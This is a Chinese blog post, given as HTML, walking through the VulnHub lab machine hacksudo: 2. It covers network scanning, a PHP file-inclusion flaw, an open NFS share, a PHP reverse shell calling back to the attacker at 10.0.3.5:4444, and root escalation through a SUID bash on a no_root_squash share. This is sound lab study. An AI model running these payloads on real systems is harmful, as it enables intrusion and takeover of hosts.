@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hacksudo: 2 (HackDudo)">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/04/02/hacksudo%202%20(HackDudo)/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-02T04:25:37.000Z">
+<meta property="article:modified_time" content="2024-04-02T04:42:41.956Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub 靶场">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/04/02/hacksudo%202%20(HackDudo)/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/04/02/hacksudo%202%20(HackDudo)/","path":"2024/04/02/hacksudo 2 (HackDudo)/","title":"hacksudo: 2 (HackDudo)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>hacksudo: 2 (HackDudo) | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/04/02/hacksudo%202%20(HackDudo)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="hacksudo: 2 (HackDudo) | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hacksudo: 2 (HackDudo)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-04-02 12:25:37 / 修改时间：12:42:41" itemprop="dateCreated datePublished" datetime="2024-04-02T12:25:37+08:00">2024-04-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">hacksudo:
+2 (HackDudo) ~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> Currently scanning: Finished!   |   Screen View: Unique Hosts   </span><br><span class="line"> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240 </span><br><span class="line">____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 10.0.3.1        52:54:00:12:35:00      1      60  Unknown vendor  </span><br><span class="line"> 10.0.3.2        52:54:00:12:35:00      1      60  Unknown vendor   </span><br><span class="line"> 10.0.3.3        08:00:27:f8:70:be      1      60  PCS Systemtechnik GmbH   </span><br><span class="line"> 10.0.3.6        08:00:27:f6:ff:ec      1      60  PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
+<p>靶机：10.0.3.6</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.0.3.6 -p1-65535</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 11:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.6 (10.0.3.6)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65527 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-title: hacksudo:2</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      38677/tcp   mountd</span><br><span class="line">|   100005  1,2,3      54046/udp6  mountd</span><br><span class="line">|   100005  1,2,3      55239/udp   mountd</span><br><span class="line">|   100005  1,2,3      57721/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      32959/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      38629/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      40313/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      56487/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">1337/tcp  open  ssh      OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 52:2e:98:98:b9:e9:c0:92:ed:ac:f8:8c:ee:3c:2e:dc (RSA)</span><br><span class="line">|   256 6b:bb:8c:90:71:6a:f9:e8:2a:12:8f:0a:78:2b:26:7d (ECDSA)</span><br><span class="line">|_  256 13:68:45:ff:32:68:0c:e4:b5:1e:9b:ae:b6:33:f3:be (ED25519)</span><br><span class="line">2049/tcp  open  nfs      3-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">32959/tcp open  nlockmgr 1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">38677/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">59045/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">59637/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">MAC Address: 08:00:27:F6:FF:EC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 5.0 - 5.5</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.51 ms 10.0.3.6 (10.0.3.6)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 38.07 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.6/&quot;</span> -w /usr/share/wordlists/dirb/common.txt -e php,txt,html -t 5 -f</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Target: http://10.0.3.6/</span><br><span class="line"></span><br><span class="line">[11:36:05] Starting: </span><br><span class="line">[11:36:18] 301 -  304B  - /audio  -&gt;  http://10.0.3.6/audio/                </span><br><span class="line">[11:36:20] 200 -  559B  - /audio/                                           </span><br><span class="line">[11:36:39] 301 -  302B  - /css  -&gt;  http://10.0.3.6/css/                    </span><br><span class="line">[11:36:39] 200 -  451B  - /css/                                             </span><br><span class="line">[11:36:59] 200 -  180B  - /file.php                                         </span><br><span class="line">[11:37:05] 200 -   10KB - /game.html                                        </span><br><span class="line">[11:37:15] 403 -  273B  - /icons/                                           </span><br><span class="line">[11:37:20] 200 -   24KB - /info.php                                         </span><br><span class="line">[11:37:29] 301 -  302B  - /lib  -&gt;  http://10.0.3.6/lib/                    </span><br><span class="line">[11:37:29] 200 -  612B  - /lib/                                             </span><br><span class="line">[11:38:32] 403 -  273B  - /server-status                                    </span><br><span class="line">[11:38:32] 403 -  273B  - /server-status/</span><br><span class="line">[11:38:50] 200 -    1KB - /test.html                                        </span><br><span class="line">[11:38:50] 200 -  502B  - /test123.html                                     </span><br><span class="line">[11:38:52] 301 -  304B  - /tiles  -&gt;  http://10.0.3.6/tiles/                </span><br><span class="line">[11:38:52] 200 -  450B  - /tiles/</span><br><span class="line">[11:39:06] 301 -  302B  - /web  -&gt;  http://10.0.3.6/web/                    </span><br><span class="line">[11:39:06] 200 -  455B  - /web/                                             </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>/file.php 可能存在文件包含漏洞，FUZZ 下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -Z -u 10.0.3.6/file.php?FUZZ=/etc/passwd -w /usr/share/wordlists/wfuzz/general/common.txt --hw 14</span><br></pre></td></tr></table></figure>
+<p>找到个file 参数，读取下file.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">……file=php://filter/read=convert.base64-encode/resource=file.php</span><br><span class="line">=&gt;</span><br><span class="line">PGh0bWw+CjxoZWFkPjx0aXRsZT5oYWNrc3VkbyBmaWxlIGFjY2VzczwvdGl0bGU+PC9oZWFkPgo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpwb3dkZXJibHVlOyI+Cjw/cGhwCiAgICRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgiaW5kZXgucGhwIik7CiAgIH0KICAgPz4KPGgxPjxtYXJxdWVlPmhhY2tzdWRvIEZJTGUgYWNjZXNzPC9tYXJxdWVlPjwvaDE+Cjxicj48Y2VudGVyPjxhIGhyZWY9Imh0dHBzOi8vaGFja3N1ZG8uY29tIj5oYWNrc3VkbyBXRUJTSVRFPC9hPjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4K</span><br><span class="line">=&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;&lt;title&gt;hacksudo file access&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:powderblue;&quot;</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">   <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(isset(<span class="variable">$file</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       include(<span class="string">&quot;<span class="variable">$file</span>&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       include(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   ?&gt;</span><br><span class="line">&lt;h1&gt;&lt;marquee&gt;hacksudo FILe access&lt;/marquee&gt;&lt;/h1&gt;</span><br><span class="line">&lt;br&gt;&lt;center&gt;&lt;a href=<span class="string">&quot;https://hacksudo.com&quot;</span>&gt;hacksudo WEBSITE&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>尝试进一步利用文件包含漏洞 【<a
+target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/371065742">文件包含漏洞GetShell利用方法丨漏洞银行技术分享
+- 知乎</a>】，均未成功，读取 ssh 日志也未成功！暂存看看其他的</p>
+<p>端口扫描发现靶机开了 nfs【<a
+target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/554370248">NFS服务详解 - 知乎</a>】
+，简言之：通过使用NFS协议，客户机可以像访问本地目录一样访问远程服务器中的共享资源</p>
+<p>查看服务端的共享目录及网段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 10.0.3.6  </span><br><span class="line">…………  </span><br><span class="line">Export list <span class="keyword">for</span> 10.0.3.6:  </span><br><span class="line">/mnt/nfs *  </span><br></pre></td></tr></table></figure>
+<p>对访问没有做限制，直接将共享目录挂载到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 10.0.3.6:/mnt/nfs  </span><br><span class="line">……  </span><br><span class="line">Filesystem         Size  Used Avail Use% Mounted on</span><br><span class="line">udev               1.9G     0  1.9G   0% /dev</span><br><span class="line">tmpfs              393M 1012K  392M   1% /run</span><br><span class="line">/dev/sda1           79G   14G   61G  19% /</span><br><span class="line">tmpfs              2.0G     0  2.0G   0% /dev/shm</span><br><span class="line">tmpfs              5.0M     0  5.0M   0% /run/lock</span><br><span class="line">tmpfs              393M  120K  393M   1% /run/user/0</span><br><span class="line">10.0.3.6:/mnt/nfs   16G  5.2G  9.6G  35% /mnt  </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021010018.png" /></p>
+<p>读到 flag1.txt</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>结合文件包含漏洞写个反弹 shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">echo</span> shell_working; </span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php -r \&#x27;$sock=fsockopen(&quot;10.0.3.5&quot;,&quot;4444&quot;);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>http://10.0.3.6/file.php?file=/mnt/nfs/reshell.php</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021050555.png" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<p>常规命令没找到可提权信息，尝试用 nfs 提权</p>
+<p>当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。</p>
+<p>①查看NFS服务器上的共享目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo showmount -e x.x.x.x</span><br></pre></td></tr></table></figure>
+<p>②创建本地挂载目录，挂载共享目录。使用攻击者本地root权限创建Suid
+shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /tmp</span><br><span class="line">sudo mount -t nfs x.x.x.x:/home/test /tmp</span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/shell</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/shell</span><br></pre></td></tr></table></figure>
+<p>③回到要提权的服务器上，使用普通用户使用 <code>./shell -p</code>
+来获取root权限。</p>
+<p>注， kali 的 <code>/bin/bash</code> 版本可能会过高</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021223815.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021223816.png" /></p>
